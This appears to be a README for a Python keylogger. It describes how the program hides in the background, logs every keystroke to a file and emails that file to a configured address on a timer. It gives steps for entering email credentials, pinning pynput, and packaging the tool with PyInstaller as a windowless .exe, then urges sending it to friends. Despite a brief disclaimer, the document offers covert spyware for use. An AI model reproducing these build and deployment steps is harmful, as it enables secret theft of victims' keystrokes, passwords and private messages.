# Instructions
A simple but very efficient Keylogger program! 
On execution, it secretly runs and saves everything the user types in a file, called "key.log".
Then, it sends an email with a specified delay to a specific email address with this file attached!
The user can't see any of this as it runs secretly in background: the user has to manually kill the process with task manager or reboot the pc to stop this.

### **Note: please, don't use this to harm other people. _I do not take responsibility for the harm caused with this file_**

## Usage
To make this work, you have to install all the dependencies and manually change lines 14, 15 and 16, with the sender's email, receiver's email and sender's email's password respectively.
You can also change the delay between each email by modifying line 41 and replacing the function's argument to your desired time in seconds (10 minutes default).

## Dependencies
- Pynput *(important: install version 1.6.8, as the newest version has troubles running with PyInstaller)*. You can install this with: pip install pynput=1.6.8
- PyInstaller (if you want to transform this file to a executable file)

## How to convert it to an exe file
Install the latest version of PyInstaller. Run the cmd in the same folder as the main.py file and simply run this command on the cmd:
pyinstaller --onefile -w main.py
Go to the new created directory "dist" and you'll see your desired .exe file with every dependency in it, so it can be run in any computer! 
Sent it to your friends and have fun!
